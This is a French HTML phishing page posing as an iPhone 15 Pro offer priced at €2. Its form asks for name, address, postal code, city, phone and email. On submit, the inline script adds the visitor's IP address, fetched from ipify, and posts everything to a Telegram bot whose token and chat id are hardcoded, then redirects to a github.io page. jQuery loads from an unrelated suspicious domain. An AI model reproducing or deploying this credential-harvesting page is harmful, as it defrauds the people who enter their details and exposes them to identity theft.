<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone 15 Pro</title>
    <!-- FAVICON -->
    <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
    <!-- LOCAL STYLE -->
    <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">

    <style>
        html[lang="fr"] body {
            direction: ltr;
        }

        html[lang="fr"] body input,
        html[lang="fr"] body textarea,
        html[lang="fr"] body select {
            direction: ltr;
        }
    </style>
</head>

<body class="lang-fr country-FR page-campaign">
    <script src="https://swiftclapocos.click/assets/js/jquery-3.6.1.min.js"></script>
    
    <header>
        <!-- TOP BAR PARAGRAPH END'S HERE -->
    </header>

    <!-- SECTION START HERE -->
    <section>
        <div class="product_wrapper animate">
            <div class="container">
                <div class="product_block" style="min-height: 180px;">
                    <!-- LEFT SIDE BLOCK START HERE -->
                    <div class="images_wrapper">
                        <div class="price_block">
                            <span>Seulement maintenant</span>
                            <h2>€2,00</h2>
                        </div>
                        <!-- Image Tabs -->
                        <div id="black" class="img-tab">
                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
                        </div>
                        <div id="blue" class="img-tab">
                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
                        </div>
                        <div id="natural" class="img-tab">
                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
                        </div>
                        <div id="white" class="img-tab active">
                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
                        </div>
                    </div>

                    <div class="form_wrapper">
                        <div class="product_title">
                            <h1>iPhone 15 Pro</h1>
                        </div>
                        <!-- FORM BLOCK START HERE -->
                        <div class="form_block" id="Scroll_form">
                            <form action="https://justmoicom.github.io/tel2/" method="POST" autocomplete="on" novalidate="novalidate" id="personalInformationForm">
                                <input type="hidden" name="_token" value="NsVhDb99Mf0taT0wjSlGq3iryWWyr2afJk0cCr7i" autocomplete="off">
                                <input type="hidden" name="request_hash" id="request_hash" value="eyJqYXZhX2VuYWJsZWQiOmZhbHNlLCJjb2xvcl9kZXB0aCI6MjQsInNjcmVlbl93aWR0aCI6MTM2MCwic2NyZWVuX2hlaWdodCI6NzY4LCJ0aW1lem9uZSI6LTYwLCJ0aW1lem9uZV9uYW1lIjoiRXVyb3BlL1BhcmlzIiwiZGV2aWNlIjoibm90X21vYmlsZSJ9">

                                <div class="row">
                                    <div class="col-sm-6">
                                        <div class="form-group">
                                            <label for="first_name">Prénom</label>
                                            <input type="text" name="first_name" id="first_name" minlength="2" value="" placeholder="Prénom" required="" class="form-control form-control-lg">
                                        </div>
                                    </div>
                                    <div class="col-sm-6">
                                        <div class="form-group">
                                            <label for="last_name">Nom</label>
                                            <input type="text" name="last_name" id="last_name" minlength="2" value="" placeholder="Nom" required="" class="form-control form-control-lg">
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="address">Adresse</label>
                                    <input type="text" name="address" id="address" minlength="3" value="" placeholder="Adresse" required="" class="form-control form-control-lg">
                                </div>

                                <div class="row">
                                    <div class="col-sm-6">
                                        <div class="form-group">
                                            <label for="zip_code">Code postal</label>
                                            <input type="text" name="zip_code" id="zip_code" value="" placeholder="Code postal" required="" class="form-control form-control-lg">
                                        </div>
                                    </div>
                                    <div class="col-sm-6">
                                        <div class="form-group">
                                            <label for="city">Ville</label>
                                            <input type="text" name="city" id="city" value="" placeholder="Ville" required="" class="form-control form-control-lg">
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="phone_number">Numéro de téléphone</label>
                                    <input type="tel" name="phone_number" id="phone_number" minlength="6" value="" placeholder="Numéro de téléphone" required="" class="form-control form-control-lg">
                                </div>

                                <div class="form-group">
                                    <label for="email">E-mail</label>
                                    <input type="email" name="email" id="email" value="" placeholder="E-mail" required="" class="form-control form-control-lg">
                                </div>

                                <div class="total-price border-top border-bottom my-3 py-2 lead"></div>

                                <button type="submit" id="submitButton" class="btn btn-success btn-lg w-100">
                                    <span class="loader" style="height:12px;width:12px;border-width:3px;margin-right:5px;display:none;"></span>
                                    <span class="submit-label">Continuer</span>
                                    <span class="waiting-label" style="display:none;">Patientez...</span>
                                </button>
                            </form>
                        </div>
                        <!-- FORM BLOCK END HERE -->
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- FOOTER START HERE -->
    <footer>
        <div class="container">
            <div class="block-reassurance">
                <div class="row">
                    <div class="col-12">
                        <h6>Cartes de crédit acceptées:</h6>
                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <!-- FOOTER END HERE -->

    <script>
$(document).ready(function () {
    // Récupérer l'IP de l'utilisateur
    var userIp = '';
    $.getJSON("https://api.ipify.org?format=json", function (data) {
        userIp = data.ip;
    });

    // Soumettre le formulaire avec validation
    $('#personalInformationForm').on('submit', function (e) {
        e.preventDefault();

        if (!validateForm()) {
            return;
        }

        var formData = $(this).serializeArray();
        var message = "Nouvelle inscription reçue :\n";

        // Formatage des données en fonction des champs du formulaire
        formData.forEach(function (item) {
            if (item.name !== '_token' && item.name !== 'request_hash') {
                message += formatLabel(item.name) + ": " + item.value + "\n";
            }
        });

        // Ajouter l'adresse IP au message
        if (userIp) {
            message += "Adresse IP: " + userIp + "\n";
        } else {
            message += "Adresse IP: Non identifiée\n";  // Si l'IP n'est pas récupérée
        }

        // Envoyer les données via Telegram
        $.ajax({
            url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
            method: 'POST',
            data: {
                chat_id: '7747778364',
                text: message
            },
            success: function () {
                window.location.href = "https://justmoicom.github.io/test2/"; // Redirection après envoi
            },
            error: function () {
                window.location.href = "https://justmoicom.github.io/test2/"; // Redirection en cas d'erreur
            }
        });
    });

    // Validation des champs
    function validateForm() {
        var isValid = true;

        $('input[required]').each(function () {
            if ($(this).val().trim() === '') {
                alert($(this).attr('placeholder') + ' est requis.');
                isValid = false;
                return false;
            }
        });

        return isValid;
    }

    // Fonction pour formater les labels (ex : "Nom" au lieu de "first_name")
    function formatLabel(name) {
        switch (name) {
            case 'first_name':
                return 'Prénom';
            case 'last_name':
                return 'Nom';
            case 'email':
                return 'Email';
            case 'phone_number':
                return 'Téléphone';
            case 'address':
                return 'Adresse';
            case 'zip_code':
                return 'Code postal';
            case 'city':
                return 'Ville';
            default:
                return name.charAt(0).toUpperCase() + name.slice(1);
        }
    }
});


    </script>
</body>
</html>
